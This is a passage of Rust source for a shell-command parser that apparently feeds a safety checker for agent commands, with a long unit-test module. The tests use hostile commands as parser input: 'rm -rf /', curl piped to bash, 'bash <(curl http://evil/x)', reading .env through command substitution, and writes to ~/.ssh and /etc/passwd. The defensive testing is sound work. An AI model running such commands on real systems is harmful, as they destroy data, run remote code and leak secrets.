                redirects.push(Redirect { op, target });
            },
            Token::HeredocBody(_) | Token::And | Token::Or | Token::Semi => {
                cursor += 1;
            },
        }
    }
    if !words.is_empty() {
        commands.push(parse_argv(words, subst_bodies, nesting_budget));
    }
    Pipeline {
        commands,
        redirects,
    }
}

/// Pull the word following a redirect operator. For `Heredoc`, expect a
/// `HeredocBody` token; otherwise expect a `Word`. If the next token is
/// something else (parser drift), put it back into `words` when it is a
/// stray `Word` so we do not silently lose user input, and yield an
/// empty target so the redirect itself is still surfaced.
///
/// `cursor` enters pointing at the redirect operator and leaves pointing
/// past whatever was examined — the lookahead token is consumed whether
/// or not it turned out to be a usable target.
fn take_redirect_target(
    tokens: &mut [Token],
    cursor: &mut usize,
    op: RedirectOp,
    words: &mut Vec<String>,
    subst_bodies: &mut Vec<String>,
) -> String {
    *cursor += 1;
    let Some(slot) = tokens.get_mut(*cursor) else {
        return String::new();
    };
    *cursor += 1;
    match std::mem::replace(slot, Token::Semi) {
        Token::HeredocBody(body) if op == RedirectOp::Heredoc => body,
        Token::Word {
            text,
            subst_bodies: bodies,
        } if op != RedirectOp::Heredoc => {
            // Redirect targets can carry $(…) too; fold bodies into the
            // preceding argv so subst_argv still surfaces them. Each one
            // also contributes a placeholder word, which `parse_argv`
            // filters out — it only has to keep the argv non-empty so a
            // bare `> $(cmd)` still yields a command carrying the body.
            if let Some(bodies) = bodies {
                for body in *bodies {
                    words.push(String::new());
                    subst_bodies.push(body);
                }
            }
            text
        },
        Token::Word {
            text,
            subst_bodies: bodies,
        } => {
            words.push(text);
            push_subst_bodies(subst_bodies, bodies);
            String::new()
        },
        _ => String::new(),
    }
}

/// Build an [`Argv`] from the words of one pipeline stage.
///
/// `words` is consumed in place — it becomes [`Argv::args`] without the
/// elements being copied — and `subst_bodies` carries the command
/// substitutions collected from those words (ADR 0008).
fn parse_argv(mut words: Vec<String>, subst_bodies: Vec<String>, nesting_budget: usize) -> Argv {
    words.retain(|word| !word.is_empty());
    // VecDeque so the head-stripping loop runs in O(N) overall instead
    // of O(N²) — `Vec::remove(0)` shifts every remaining element. The
    // conversion re-uses the `Vec`'s buffer rather than copying.
    let mut words: std::collections::VecDeque<String> = words.into();
    let mut env_assignments = Vec::new();
    while let Some(first) = words.front() {
        match split_env_assignment(first) {
            Some((k, v)) => {
                env_assignments.push(EnvAssignment { key: k, value: v });
                words.pop_front();
            },
            None => break,
        }
    }
    let head = words.pop_front().unwrap_or_default();
    let mut argv = Argv {
        env_assignments,
        head,
        args: words.into(),
        inner_argv: Vec::new(),
        inner_code: Vec::new(),
        inner_redirects: Vec::new(),
        subst_argv: Vec::new(),
    };
    if nesting_budget > 0 {
        let child_budget = nesting_budget - 1;
        augment_inner_commands(&mut argv, child_budget);
        for body in subst_bodies {
            let inner = parse_inner_shell(&body, child_budget);
            argv.subst_argv.extend(inner.commands);
            // ponytail: subst redirects reuse inner_redirects (no separate
            // field); self-protection / sensitive-bash-read already walk it.
            argv.inner_redirects.extend(inner.redirects);
        }
    }
    argv
}

fn augment_inner_commands(argv: &mut Argv, nesting_budget: usize) {
    if let Some(code) = extract_shell_dash_c(argv) {
        merge_inner_shell(argv, &code, nesting_budget);
    }
    if let Some(code) = extract_su_command(argv) {
        merge_inner_shell(argv, &code, nesting_budget);
    }
    if let Some(code) = extract_eval_code(argv) {
        merge_inner_shell(argv, &code, nesting_budget);
    }
    if let Some(inner) = extract_xargs_inner(argv, nesting_budget) {
        argv.inner_argv.push(inner);
    }
    if let Some(inner) = extract_find_exec_inner(argv, nesting_budget) {
        argv.inner_argv.push(inner);
    }
}

fn merge_inner_shell(argv: &mut Argv, code: &str, nesting_budget: usize) {
    argv.inner_code.push(code.to_string());
    let inner = parse_inner_shell(code, nesting_budget);
    argv.inner_argv.extend(inner.commands);
    argv.inner_redirects.extend(inner.redirects);
}

struct InnerShell {
    commands: Vec<Argv>,
    redirects: Vec<Redirect>,
}

fn parse_inner_shell(code: &str, nesting_budget: usize) -> InnerShell {
    let inner = parse_with_depth(code, nesting_budget);
    let mut commands = Vec::new();
    let mut redirects = Vec::new();
    for segment in inner.segments {
        redirects.extend(segment.redirects.iter().cloned());
        commands.extend(segment.commands);
    }
    InnerShell {
        commands,
        redirects,
    }
}

fn extract_shell_dash_c(argv: &Argv) -> Option<String> {
    if !is_shell_dash_c_head(&argv.head) {
        return None;
    }
    extract_dash_c_payload(&argv.args)
}

/// Pull the payload from a `su -c CODE` invocation. `su` carries the
/// command to run as shell code (possibly a whole pipeline), so it is
/// surfaced as `inner_*` rather than unwrapped like the prefix wrappers.
fn extract_su_command(argv: &Argv) -> Option<String> {
    if head_basename(&argv.head) != "su" {
        return None;
    }
    extract_dash_c_payload(&argv.args)
}

/// Pull the code string following a `-c` option. Handles short-flag
/// clusters (`-c`, `-lc`), the `--command VALUE` long form, and the
/// inline `--command=VALUE` form.
fn extract_dash_c_payload(args: &[String]) -> Option<String> {
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        if let Some(value) = arg.strip_prefix("--command=") {
            return Some(value.to_string());
        }
        if arg == "--command" {
            return iter.next().cloned();
        }
        if short_flag_cluster_contains(arg, 'c') {
            return iter.next().cloned();
        }
    }
    None
}

fn is_shell_dash_c_head(head: &str) -> bool {
    matches!(
        head_basename(head),
        "bash" | "sh" | "zsh" | "ksh" | "dash" | "fish"
    )
}

fn extract_eval_code(argv: &Argv) -> Option<String> {
    if head_basename(&argv.head) != "eval" {
        return None;
    }
    argv.args.iter().find(|arg| !arg.starts_with('-')).cloned()
}

fn extract_xargs_inner(argv: &Argv, nesting_budget: usize) -> Option<Argv> {
    if head_basename(&argv.head) != "xargs" {
        return None;
    }
    let start = xargs_command_start(&argv.args)?;
    let words: Vec<String> = argv.args.iter().skip(start).cloned().collect();
    if words.is_empty() {
        return None;
    }
    Some(parse_argv(words, Vec::new(), nesting_budget))
}

fn xargs_command_start(args: &[String]) -> Option<usize> {
    let mut i = 0;
    while i < args.len() {
        let arg = args[i].as_str();
        if arg == "--" {
            return (i + 1 < args.len()).then_some(i + 1);
        }
        if !arg.starts_with('-') || arg == "-" {
            return Some(i);
        }
        if xargs_flag_takes_value(arg) && i + 1 < args.len() && !arg.contains('=') {
            i += 2;
        } else {
            i += 1;
        }
    }
    None
}

fn xargs_flag_takes_value(arg: &str) -> bool {
    matches!(
        arg,
        "-a" | "-d"
            | "-E"
            | "-e"
            | "-I"
            | "-i"
            | "-L"
            | "-l"
            | "-n"
            | "-P"
            | "-s"
            | "--arg-file"
            | "--delimiter"
            | "--eof"
            | "--eof-str"
            | "--replace"
            | "--max-lines"
            | "--max-args"
            | "--max-procs"
            | "--max-chars"
    )
}

fn extract_find_exec_inner(argv: &Argv, nesting_budget: usize) -> Option<Argv> {
    if head_basename(&argv.head) != "find" {
        return None;
    }
    let start = argv
        .args
        .iter()
        .position(|arg| arg == "-exec" || arg == "-execdir")?;
    let end = argv
        .args
        .iter()
        .skip(start + 1)
        .position(|arg| arg == ";" || arg == "+")?;
    let words: Vec<String> = argv
        .args
        .iter()
        .skip(start + 1)
        .take(end)
        .filter(|arg| arg.as_str() != "{}")
        .cloned()
        .collect();
    if words.is_empty() {
        return None;
    }
    Some(parse_argv(words, Vec::new(), nesting_budget))
}

/// Reduce a command head to its basename for wrapper/interpreter
/// matching. Splits on `/` only: the POSIX path separator. Windows `\`
/// is deliberately not split — `ptuf` targets POSIX shells, so a
/// backslash inside a head is a literal character, not a separator.
pub(crate) fn head_basename(head: &str) -> &str {
    head.rsplit('/').next().unwrap_or(head)
}

fn short_flag_cluster_contains(arg: &str, flag: char) -> bool {
    let Some(rest) = arg.strip_prefix('-') else {
        return false;
    };
    if rest.starts_with('-') || rest.is_empty() {
        return false;
    }
    rest.chars().any(|c| c == flag)
}

fn is_valid_env_key(key: &str) -> bool {
    key.chars()
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Allocation-free check for the `split_env_assignment` shape, for callers
/// that only need to know whether a token is an assignment, not its parts.
fn is_env_assignment(word: &str) -> bool {
    word.find('=')
        .is_some_and(|eq| eq != 0 && is_valid_env_key(&word[..eq]))
}

fn split_env_assignment(word: &str) -> Option<(String, String)> {
    let eq = word.find('=')?;
    if eq == 0 || !is_valid_env_key(&word[..eq]) {
        return None;
    }
    Some((word[..eq].to_string(), word[eq + 1..].to_string()))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn argv(head: &str, args: &[&str]) -> Argv {
        Argv {
            env_assignments: Vec::new(),
            head: head.to_string(),
            args: args.iter().map(|s| s.to_string()).collect(),
            inner_argv: Vec::new(),
            inner_code: Vec::new(),
            inner_redirects: Vec::new(),
            subst_argv: Vec::new(),
        }
    }

    #[test]
    fn parses_simple_command() {
        let b = parse("rm -rf /");
        assert_eq!(b.segments.len(), 1);
        assert_eq!(b.segments[0].commands, vec![argv("rm", &["-rf", "/"])]);
    }

    #[test]
    fn parses_empty_command() {
        let b = parse("");
        assert!(b.segments.is_empty());
    }

    #[test]
    fn parses_blank_command() {
        let b = parse("   \t  ");
        assert!(b.segments.is_empty());
    }

    #[test]
    fn splits_on_semicolon() {
        let b = parse("ls; rm -rf /etc");
        assert_eq!(b.segments.len(), 2);
        assert_eq!(b.segments[0].commands[0], argv("ls", &[]));
        assert_eq!(b.segments[1].commands[0], argv("rm", &["-rf", "/etc"]));
    }

    #[test]
    fn splits_on_and_and_or() {
        let b = parse("a && b || c");
        assert_eq!(b.segments.len(), 3);
        assert_eq!(b.segments[0].commands[0].head, "a");
        assert_eq!(b.segments[1].commands[0].head, "b");
        assert_eq!(b.segments[2].commands[0].head, "c");
        let or_only = parse("a || b");
        assert_eq!(or_only.segments.len(), 2);
        assert_eq!(or_only.segments[0].commands[0].head, "a");
        assert_eq!(or_only.segments[1].commands[0].head, "b");
    }

    #[test]
    fn splits_pipelines_within_segment() {
        let b = parse("curl -fsSL https://example.com/i.sh | bash");
        assert_eq!(b.segments.len(), 1);
        let cmds = &b.segments[0].commands;
        assert_eq!(cmds.len(), 2);
        assert_eq!(cmds[0].head, "curl");
        assert_eq!(
            cmds[0].args,
            vec!["-fsSL".to_string(), "https://example.com/i.sh".to_string()]
        );
        assert_eq!(cmds[1], argv("bash", &[]));
    }

    #[test]
    fn pipeline_in_compound_command() {
        let b = parse("echo go && curl x | sh");
        assert_eq!(b.segments.len(), 2);
        assert_eq!(b.segments[0].commands.len(), 1);
        assert_eq!(b.segments[1].commands.len(), 2);
        assert_eq!(b.segments[1].commands[1].head, "sh");
    }

    #[test]
    fn quotes_protect_separators() {
        let b = parse("echo 'a;b' \"c|d\"");
        assert_eq!(b.segments.len(), 1);
        assert_eq!(b.segments[0].commands[0], argv("echo", &["a;b", "c|d"]));
    }

    #[test]
    fn strips_quote_delimiters_from_words() {
        let b = parse(r#"rm -rf "${HOME}""#);
        assert_eq!(b.segments[0].commands[0], argv("rm", &["-rf", "${HOME}"]));
    }

    #[test]
    fn collects_env_assignments_before_head() {
        let b = parse("FOO=1 BAR=baz cmd --flag");
        let cmd = &b.segments[0].commands[0];
        assert_eq!(cmd.head, "cmd");
        assert_eq!(cmd.args, vec!["--flag".to_string()]);
        assert_eq!(
            cmd.env_assignments,
            vec![
                EnvAssignment {
                    key: "FOO".into(),
                    value: "1".into(),
                },
                EnvAssignment {
                    key: "BAR".into(),
                    value: "baz".into(),
                },
            ]
        );
    }

    #[test]
    fn does_not_treat_url_as_env_assignment() {
        // `https://...` has `://` not `=`, but verify that a URL with a
        // query string is still treated as a single arg, not as an env.
        let b = parse("curl https://example.com/?key=value");
        let cmd = &b.segments[0].commands[0];
        assert_eq!(cmd.head, "curl");
        assert!(cmd.env_assignments.is_empty());
    }

    #[test]
    fn rejects_env_with_non_identifier_key() {
        // `1FOO=bar` is not a valid env key (starts with digit).
        let b = parse("1FOO=bar cmd");
        let first = &b.segments[0].commands[0];
        assert_eq!(first.head, "1FOO=bar");
        assert!(first.env_assignments.is_empty());
    }

    #[test]
    fn flags_iterator_filters_dash_args() {
        let cmd = argv("rm", &["-rf", "--force", "/etc", "build"]);
        let flags: Vec<_> = cmd.flags().collect();
        assert_eq!(flags, vec!["-rf", "--force"]);
        let pos: Vec<_> = cmd.positional().collect();
        assert_eq!(pos, vec!["/etc", "build"]);
    }

    #[test]
    fn lone_dash_is_not_a_flag() {
        let cmd = argv("tar", &["-czf", "-", "."]);
        let flags: Vec<_> = cmd.flags().collect();
        assert_eq!(flags, vec!["-czf"]);
        let pos: Vec<_> = cmd.positional().collect();
        assert_eq!(pos, vec!["-", "."]);
    }

    #[test]
    fn double_dash_separator_is_not_a_flag() {
        let cmd = argv("rm", &["--", "--weird-file"]);
        let flags: Vec<_> = cmd.flags().collect();
        assert_eq!(flags, vec!["--weird-file"]);
        let pos: Vec<_> = cmd.positional().collect();
        assert_eq!(pos, vec!["--"]);
    }

    #[test]
    fn full_path_command_keeps_head_intact() {
        let b = parse("/usr/bin/rm -rf /etc");
        assert_eq!(b.segments[0].commands[0].head, "/usr/bin/rm");
    }

    #[test]
    fn handles_backslash_escapes_outside_quotes() {
        let b = parse(r"echo a\;b");
        // Outside quotes, `\;` should escape the `;` so it becomes part
        // of the word rather than splitting segments.
        assert_eq!(b.segments.len(), 1);
        assert_eq!(b.segments[0].commands[0], argv("echo", &["a;b"]));
    }

    #[test]
    fn handles_backtick_substring_as_word_chunk() {
        let b = parse("echo `date`");
        let outer = &b.segments[0].commands[0];
        assert_eq!(outer.head, "echo");
        assert_eq!(outer.args, vec!["date".to_string()]);
        assert_eq!(outer.subst_argv, vec![argv("date", &[])]);
        assert!(b.has_command_substitution);
    }

    #[test]
    fn flags_command_substitution_on_dollar_paren() {
        let b = parse("echo $(date)");
        assert!(b.has_command_substitution);
    }

    #[test]
    fn flags_command_substitution_inside_double_quotes() {
        let b = parse(r#"echo "hello $(whoami)""#);
        assert!(b.has_command_substitution);
    }

    #[test]
    fn does_not_flag_dollar_paren_inside_single_quotes() {
        // Single-quoted spans are literal, so `$(...)` inside is data.
        let b = parse("echo '$(date)'");
        assert!(!b.has_command_substitution);
    }

    #[test]
    fn does_not_flag_plain_command() {
        let b = parse("ls -la /etc");
        assert!(!b.has_command_substitution);
    }

    #[test]
    fn subst_argv_surfaces_dollar_paren_body() {
        let b = parse("echo $(cat .env)");
        assert!(b.has_command_substitution);
        let outer = &b.segments[0].commands[0];
        assert_eq!(outer.head, "echo");
        assert_eq!(outer.subst_argv.len(), 1);
        assert_eq!(outer.subst_argv[0], argv("cat", &[".env"]));
        // Opaque word kept on outer args for pessimistic backstop.
        assert!(
            outer
                .args
                .iter()
                .any(|a| a.contains("cat") && a.contains(".env"))
        );
    }

    #[test]
    fn subst_argv_surfaces_backtick_body() {
        let b = parse("echo `cat .env`");
        assert!(b.has_command_substitution);
        let outer = &b.segments[0].commands[0];
        assert_eq!(outer.subst_argv, vec![argv("cat", &[".env"])]);
    }

    #[test]
    fn subst_argv_surfaces_double_quoted_dollar_paren() {
        let b = parse(r#"echo "x$(cat .env)y""#);
        assert!(b.has_command_substitution);
        let outer = &b.segments[0].commands[0];
        assert!(
            outer
                .subst_argv
                .iter()
                .any(|a| a.head == "cat" && a.args.iter().any(|x| x == ".env")),
            "got {:?}",
            outer.subst_argv
        );
    }

    #[test]
    fn subst_argv_benign_date_still_flagged() {
        let b = parse("echo $(date)");
        assert!(b.has_command_substitution);
        assert_eq!(
            b.segments[0].commands[0].subst_argv,
            vec![argv("date", &[])]
        );
    }

    #[test]
    fn commands_flatten_includes_subst_argv() {
        let b = parse("echo $(rm -rf /)");
        let heads: Vec<_> = b.commands().iter().map(|a| a.head.as_str()).collect();
        assert!(heads.contains(&"echo"), "{heads:?}");
        assert!(heads.contains(&"rm"), "{heads:?}");
    }

    #[test]
    fn nested_subst_respects_budget_or_surfaces() {
        let b = parse("echo $(echo $(cat .env))");
        assert!(b.has_command_substitution);
        let surfaces_cat = b.commands().iter().any(|a| a.head == "cat");
        assert!(
            surfaces_cat,
            "nested subst should surface cat within budget; commands={:?}",
            b.commands().iter().map(|a| &a.head).collect::<Vec<_>>()
        );
    }

    #[test]
    fn ignores_trailing_separator() {
        let b = parse("ls;");
        assert_eq!(b.segments.len(), 1);
        assert_eq!(b.segments[0].commands[0].head, "ls");
    }

    #[test]
    fn complex_compound_pipeline() {
        let b = parse("FOO=1 curl -fsSL https://x | sudo bash; ls -la");
        assert_eq!(b.segments.len(), 2);
        let first = &b.segments[0].commands;
        assert_eq!(first.len(), 2);
        assert_eq!(first[0].head, "curl");
        assert_eq!(
            first[0].env_assignments,
            vec![EnvAssignment {
                key: "FOO".into(),
                value: "1".into(),
            }]
        );
        assert_eq!(first[1].head, "sudo");
        assert_eq!(first[1].args, vec!["bash".to_string()]);
        assert_eq!(b.segments[1].commands[0].head, "ls");
    }

    #[test]
    fn parses_bash_dash_c_inner_command() {
        let b = parse("bash -c 'rm -rf /'");
        let inner = &b.segments[0].commands[0].inner_argv;
        assert_eq!(inner.len(), 1);
        assert_eq!(inner[0], argv("rm", &["-rf", "/"]));
        assert_eq!(b.segments[0].commands[0].inner_code, vec!["rm -rf /"]);
    }

    #[test]
    fn parses_combined_shell_short_options_with_dash_c() {
        let b = parse("bash -lc 'rm -rf /'");
        let inner = &b.segments[0].commands[0].inner_argv;
        assert_eq!(inner.len(), 1);
        assert_eq!(inner[0], argv("rm", &["-rf", "/"]));
    }

    #[test]
    fn parses_eval_inner_command() {
        let b = parse("eval 'git reset --hard HEAD~1'");
        let inner = &b.segments[0].commands[0].inner_argv;
        assert_eq!(inner.len(), 1);
        assert_eq!(inner[0], argv("git", &["reset", "--hard", "HEAD~1"]));
    }

    #[test]
    fn parses_xargs_inner_command() {
        let b = parse("printf '/\\0' | xargs -0 rm -rf");
        let inner = &b.segments[0].commands[1].inner_argv;
        assert_eq!(inner.len(), 1);
        assert_eq!(inner[0], argv("rm", &["-rf"]));
    }

    #[test]
    fn parses_xargs_inner_command_with_dash_x_flag() {
        let b = parse("printf '/\\0' | xargs -0 -x rm -rf /");
        let inner = &b.segments[0].commands[1].inner_argv;
        assert_eq!(inner.len(), 1);
        assert_eq!(inner[0], argv("rm", &["-rf", "/"]));
    }

    #[test]
    fn parses_find_exec_inner_command() {
        let b = parse(r"find . -name tmp -exec rm -rf {} \;");
        let inner = &b.segments[0].commands[0].inner_argv;
        assert_eq!(inner.len(), 1);
        assert_eq!(inner[0], argv("rm", &["-rf"]));
    }

    #[test]
    fn preserves_redirects_from_inner_shell_code() {
        let b = parse("bash -c 'echo hi > .claude/settings.json'");
        assert_eq!(b.segments[0].commands[0].inner_redirects.len(), 1);
        assert_eq!(
            b.segments[0].commands[0].inner_redirects[0],
            Redirect {
                op: RedirectOp::Stdout,
                target: ".claude/settings.json".into(),
            }
        );
    }

    #[test]
    fn commands_flattens_nested_wrappers() {
        let b = parse("bash -c 'xargs rm -rf'");
        let heads: Vec<_> = b
            .commands()
            .into_iter()
            .map(|argv| argv.head.as_str())
            .collect();
        assert_eq!(heads, vec!["bash", "xargs", "rm"]);
    }

    // Length of the longest `inner_argv` chain reachable from `argv`.
    // Root is not counted; equals the number of unrolled wrapper hops.
    fn deepest_inner_chain(argv: &Argv) -> usize {
        argv.inner_argv
            .iter()
            .map(|a| 1 + deepest_inner_chain(a))
            .max()
            .unwrap_or(0)
    }

    #[test]
    fn inner_argv_chain_length_for_single_wrapper_is_one() {
        let b = parse("bash -c 'rm -rf /'");
        let chain = deepest_inner_chain(&b.segments[0].commands[0]);
        assert_eq!(chain, 1);
    }

    #[test]
    fn inner_argv_chain_at_budget_unrolls_both_layers() {
        let b = parse(r#"bash -c 'bash -c "rm -rf /"'"#);
        let chain = deepest_inner_chain(&b.segments[0].commands[0]);
        assert_eq!(chain, 2);
        let heads: Vec<_> = b
            .commands()
            .into_iter()
            .map(|argv| argv.head.clone())
            .collect();
        assert!(heads.contains(&"rm".to_string()), "got heads: {heads:?}");
    }

    #[test]
    fn inner_argv_chain_one_above_budget_is_capped_at_three() {
        let b = parse(r#"bash -c 'bash -c "bash -c \"bash -c \\\"rm -rf /\\\""'"'"#);
        let chain = deepest_inner_chain(&b.segments[0].commands[0]);
        assert!(
            chain <= NESTING_BUDGET,
            "chain {chain} exceeded nesting_budget={NESTING_BUDGET}"
        );
    }

    #[test]
    fn triple_nested_su_bash_c_surfaces_inner_rm() {
        let cmd = r#"su -c 'bash -c "su -c '\''rm -rf /'\''"'"#;
        let b = parse(cmd);
        let outer = &b.segments[0].commands[0];
        let chain = deepest_inner_chain(outer);
        assert!(
            chain <= NESTING_BUDGET,
            "inner_argv chain {chain} must respect nesting_budget={NESTING_BUDGET} cap"
        );
        let heads: Vec<_> = b
            .commands()
            .into_iter()
            .map(|argv| argv.head.as_str())
            .collect();
        assert!(
            heads.contains(&"rm"),
            "triple-nested su/bash must surface rm via inner_argv; got {heads:?}"
        );
    }

    #[test]
    fn lone_ampersand_does_not_loop() {
        // Found by PBT: a bare `&` (not part of `&&`) used to cause an
        // infinite loop in tokenize. Verify the lexer terminates and
        // produces no segments for inputs that contain only `&`s.
        let b = parse("&");
        assert!(b.segments.is_empty());
        let b = parse("ls & echo done");
        // The `&` is dropped; `ls` and `echo done` collapse into one
        // segment because there is no separator between them.
        assert!(!b.segments.is_empty());
    }

    #[test]
    fn empty_pipeline_segment_is_dropped() {
        // `|;` would yield an empty pipeline; ensure parse drops it.
        let b = parse("ls | ; echo done");
        // first segment "ls |" produces a pipeline with [ls]
        assert!(!b.segments.is_empty());
        assert_eq!(b.segments[0].commands[0].head, "ls");
    }

    #[test]
    fn parses_redirect_operators() {
        let cases = [
            ("echo hi > /etc/passwd", RedirectOp::Stdout, "/etc/passwd"),
            (
                "echo hi >> /var/log/x",
                RedirectOp::StdoutAppend,
                "/var/log/x",
            ),
            ("sh < script.sh", RedirectOp::Stdin, "script.sh"),
            ("cmd 2> err.log", RedirectOp::Stderr, "err.log"),
            ("cmd &> all.log", RedirectOp::Merge, "all.log"),
            // Numeric fd forms collapse to the closest common shape.
            ("echo hi 1> /etc/passwd", RedirectOp::Stdout, "/etc/passwd"),
            (
                "echo hi 1>> /var/log/x",
                RedirectOp::StdoutAppend,
                "/var/log/x",
            ),
            ("sh 0< script.sh", RedirectOp::Stdin, "script.sh"),
            ("cmd 3> out.log", RedirectOp::Stdout, "out.log"),
            // fd 2 collapses to Stderr for both `2>` and `2>>`.
            ("cmd 2>> err.log", RedirectOp::Stderr, "err.log"),
            // Multi-digit fd and the no-space form both tokenize.
            ("cmd 10> out.log", RedirectOp::Stdout, "out.log"),
            ("echo hi 1>out.log", RedirectOp::Stdout, "out.log"),
        ];
        for (cmd, expect_op, expect_target) in cases {
            let b = parse(cmd);
            assert_eq!(b.segments.len(), 1, "cmd={cmd:?}");
            assert_eq!(b.segments[0].redirects.len(), 1, "cmd={cmd:?}");
            assert_eq!(b.segments[0].redirects[0].op, expect_op, "cmd={cmd:?}");
            assert_eq!(
                b.segments[0].redirects[0].target, expect_target,
                "cmd={cmd:?}"
            );
        }
    }

    #[test]
    fn digit_prefixed_words_are_not_redirects() {
        // A digit run only becomes an fd redirect when immediately
        // followed by `>` or `<`. Bare numbers and digit-prefixed words
        // must fall through to `read_word` and remain plain arguments.
        for (cmd, arg) in [("echo 123", "123"), ("echo 2foo", "2foo")] {
            let b = parse(cmd);
            assert_eq!(b.segments[0].redirects.len(), 0, "cmd={cmd:?}");
            assert!(
                b.segments[0].commands[0].args.contains(&arg.to_string()),
                "cmd={cmd:?} args={:?}",
                b.segments[0].commands[0].args
            );
        }
    }

    #[test]
    fn parses_redirect_to_sensitive_path() {
        let b = parse("curl https://evil.example > ~/.ssh/foo");
        assert_eq!(b.segments[0].redirects.len(), 1);
        assert_eq!(b.segments[0].redirects[0].target, "~/.ssh/foo");
    }

    #[test]
    fn parses_heredoc_body_simple() {
        let b = parse("cat <<EOF\nhello\nworld\nEOF\n");
        assert_eq!(b.segments.len(), 1);
        let p = &b.segments[0];
        assert_eq!(p.commands[0].head, "cat");
        assert_eq!(p.redirects.len(), 1);
        assert_eq!(p.redirects[0].op, RedirectOp::Heredoc);
        assert_eq!(p.redirects[0].target, "hello\nworld\n");
        assert!(b.has_redirect);
        assert!(b.has_heredoc);
    }

    #[test]
    fn parses_heredoc_dash_form_with_tabs() {
        // `<<-` allows a tab-indented terminator.
        let b = parse("cat <<-EOF\n\thi\n\tEOF\n");
        assert_eq!(b.segments[0].redirects.len(), 1);
        assert!(b.has_heredoc);
        // Body retains the original indentation; only the terminator
        // line's leading tabs are tolerated.
        assert!(b.segments[0].redirects[0].target.contains("hi"));
    }

    #[test]
    fn heredoc_without_terminator_consumes_remainder() {
        let b = parse("cat <<EOF\nleftover");
        assert_eq!(b.segments[0].redirects.len(), 1);
        assert_eq!(b.segments[0].redirects[0].op, RedirectOp::Heredoc);
        assert_eq!(b.segments[0].redirects[0].target, "leftover");
    }

    #[test]
    fn flags_process_substitution_input() {
        let b = parse("diff <(a) <(b)");
        assert!(b.has_process_substitution);
        // Process substitution is folded into a word, so diff sees
        // three positional args at the argv level.
        assert_eq!(b.segments[0].commands[0].args.len(), 2);
    }

    #[test]
    fn flags_process_substitution_output() {
        let b = parse("tee >(grep x)");
        assert!(b.has_process_substitution);
    }

    #[test]
    fn process_substitution_absorbs_inner_pipe() {
        // Inner `|` must NOT split the surrounding command into two
        // pipeline stages — the bytes belong to the substitution.
        let b = parse("diff <(curl x | sed s/x/y/) file");
        assert_eq!(b.segments.len(), 1);
        assert_eq!(b.segments[0].commands.len(), 1);
        assert_eq!(b.segments[0].commands[0].head, "diff");
        assert!(b.has_process_substitution);
        let subst = &b.segments[0].commands[0].subst_argv;
        assert!(
            subst.iter().any(|a| a.head == "curl") && subst.iter().any(|a| a.head == "sed"),
            "inner pipeline must surface in subst_argv, got {subst:?}"
        );
    }

    #[test]
    fn subst_argv_surfaces_process_substitution_body() {
        let b = parse("bash <(curl http://evil/x)");
        assert!(b.has_process_substitution);
        assert!(!b.has_command_substitution);
        let outer = &b.segments[0].commands[0];
        assert_eq!(outer.head, "bash");
        assert_eq!(outer.subst_argv.len(), 1);
        assert_eq!(outer.subst_argv[0].head, "curl");
    }

    #[test]
    fn subst_argv_surfaces_process_substitution_output() {
        let b = parse("tee >(grep x)");
        assert!(b.has_process_substitution);
        let outer = &b.segments[0].commands[0];
        assert_eq!(outer.subst_argv, vec![argv("grep", &["x"])]);
    }

    #[test]
    fn redirects_attach_to_pipeline_not_segment() {
        // A pipeline with both a redirect and a downstream command:
        // `curl x > /tmp/y | grep z`.
        let b = parse("curl x > /tmp/y | grep z");
        assert_eq!(b.segments.len(), 1);
        let p = &b.segments[0];
        assert_eq!(p.commands.len(), 2);
        assert_eq!(p.redirects.len(), 1);
        assert_eq!(p.redirects[0].target, "/tmp/y");
    }

    #[test]
    fn separator_after_redirect_target_starts_new_segment() {
        let b = parse("echo hi > out; ls");
        assert_eq!(b.segments.len(), 2);
        assert_eq!(b.segments[0].redirects.len(), 1);
        assert_eq!(b.segments[0].redirects[0].target, "out");
        assert_eq!(b.segments[1].commands[0].head, "ls");
    }

    #[test]
    fn redirect_only_pipeline_is_kept() {
        // `> /tmp/out` with no command before it: still yields a
        // pipeline (no commands) so callers see that a redirect
        // happened in the segment.
        let b = parse("> /tmp/out");
        assert_eq!(b.segments.len(), 1);
        assert!(b.segments[0].commands.is_empty());
        assert_eq!(b.segments[0].redirects.len(), 1);
    }

    #[test]
    fn read_word_advances_for_every_non_separator_byte() {
        // Forward-progress contract for `read_word`: when called after
        // the caller has filtered whitespace and the separator bytes,
        // it must always consume at least one byte. Walk every printable
        // ASCII byte that is neither whitespace nor `|`/`&`/`;` and
        // ensure the lexer terminates with at least one token.
        for byte in 0x21u8..=0x7eu8 {
            if matches!(byte, b'|' | b'&' | b';') {
                continue;
            }
            let buf = [byte];
            let (_, advanced, _, _) = read_word(&buf);
            assert!(advanced > 0, "read_word stalled on byte {byte:#x}");
        }
    }

    #[test]
    fn value_flag_accessors_expose_each_spelling() {
        assert_eq!(ValueFlag::Short('a').short(), Some('a'));
        assert_eq!(ValueFlag::Short('a').long(), None);
        assert_eq!(ValueFlag::Long("user").short(), None);
        assert_eq!(ValueFlag::Long("user").long(), Some("user"));
        assert_eq!(ValueFlag::Both('u', "user").short(), Some('u'));
        assert_eq!(ValueFlag::Both('u', "user").long(), Some("user"));
    }

    #[test]
    fn unwrap_prefix_wrapper_strips_prefix_wrappers() {
        for wrapper in ["sudo", "doas", "pkexec", "run0"] {
            let inner = unwrap_prefix_wrapper(&argv(wrapper, &["rm", "-rf", "/"]))
                .unwrap_or_else(|| panic!("{wrapper} should unwrap"));
            assert_eq!(inner, argv("rm", &["-rf", "/"]));
        }
    }

    #[test]
    fn unwrap_prefix_wrapper_skips_value_flags() {
        // Each wrapper hides the inner `rm` head behind a value-taking
        // flag (short, long, and inline-`=` spellings).
        let cases: &[(&str, &[&str])] = &[
            ("sudo", &["-u", "root", "rm", "-rf", "/"]),
            ("sudo", &["-D", "/tmp", "rm", "-rf", "/"]),
            ("sudo", &["-R", "/mnt", "rm", "-rf", "/"]),
            ("sudo", &["-r", "unconfined_r", "rm", "-rf", "/"]),
            ("sudo", &["-c", "admin", "rm", "-rf", "/"]),
            ("sudo", &["--chdir", "/tmp", "rm", "-rf", "/"]),
            ("sudo", &["--chdir=/tmp", "rm", "-rf", "/"]),
            ("doas", &["-u", "root", "rm", "-rf", "/"]),
            ("doas", &["-C", "/etc/doas.conf", "rm", "-rf", "/"]),
            ("pkexec", &["--user", "root", "rm", "-rf", "/"]),
